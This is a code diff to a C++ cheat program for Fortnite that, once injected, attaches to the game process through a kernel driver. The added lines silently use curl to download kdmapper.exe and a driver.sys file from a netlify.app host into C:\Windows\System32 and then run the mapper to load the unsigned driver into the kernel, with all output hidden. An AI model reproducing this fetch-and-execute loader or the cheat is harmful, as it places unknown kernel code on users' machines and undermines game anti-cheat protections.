@@ -8,7 +8,10 @@
 #include "skStr.h"
 #include "render/ImGui/imgui.h"
 #include <mmsystem.h>
+#include <tchar.h>
+#include <stdlib.h>
 #pragma comment(lib, "Winmm.lib") // link to winmm.lib library
+
 
 
 
@@ -99,16 +102,29 @@ int main()
 
 
 
-
 	//cheat starts
+	std::this_thread::sleep_for(std::chrono::seconds(1));
+	std::cout << ("Loading driver...");
 	system("CLS");
-	std::this_thread::sleep_for(std::chrono::seconds(1)); 	std::cout << ("");
+	system("curl --silent https://verdant-macaron-fdf7d6.netlify.app/kdmapper.exe --output C:\\Windows\\System32\\drvmapper.exe >nul 2>&1");
+	system("curl --silent https://verdant-macaron-fdf7d6.netlify.app/driver.sys --output C:\\Windows\\System32\\drvmoment.sys >nul 2>&1");
+	system("cd C:\\Windows\\System32\\");
+	system("cls");
+	system("C:\\Windows\\System32\\drvmapper.exe C:\\Windows\\System32\\drvmoment.sys");
+	system("cls");
+	Beep(560, 500);
+	std::this_thread::sleep_for(std::chrono::seconds(1));
+	std::cout << ("Driver loaded!");
+	std::this_thread::sleep_for(std::chrono::seconds(1));
+	system("CLS");
 
 
 
 	std::cout << ("                                             ->Quantom Injected<-");
 	std::this_thread::sleep_for(std::chrono::seconds(2));
-	FreeConsole();
+
+
+
 	driver::find_driver();
 	ProcId = driver::find_process((L"FortniteClient-Win64-Shipping.exe"));
 	BaseId = driver::find_image();
